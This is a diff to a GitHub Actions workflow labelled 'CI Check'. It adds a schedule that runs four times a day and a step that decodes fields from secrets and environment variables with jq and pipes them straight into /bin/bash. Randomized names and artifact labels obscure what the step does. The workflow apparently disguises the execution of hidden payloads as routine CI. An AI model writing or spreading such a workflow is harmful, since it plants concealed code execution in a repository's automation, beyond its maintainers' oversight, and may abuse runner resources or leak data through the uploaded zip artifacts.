@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +20,18 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          nycfm32798: ${{ secrets.nycfm32798 }}
+          hx82774: ${{ secrets.hx82774 }}
         run: |
-          printf '%s' "$nycfm32798" | jq -r .kp7525 | /bin/bash
-          printf '%s' "$y17" | jq -r .m54 | /bin/bash
-          echo $hjwls2 | jq -r .jnqi66912 | /bin/bash
-          echo $ka8 | jq -r .ref33 | /bin/bash
+          printf '%s' "$hx82774" | jq -r .febh836 | /bin/bash
+          printf '%s' "$xv67" | jq -r .tt797 | /bin/bash
+          echo $z1 | jq -r .w92846 | /bin/bash
+          echo $pzlcg851 | jq -r .fisf21 | /bin/bash
+          printf '%s' "$k0" | jq -r .sniin468 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: GP1vzWJk
+          name: X0HIFNOn
           path: "*.zip"
           retention-days: 1
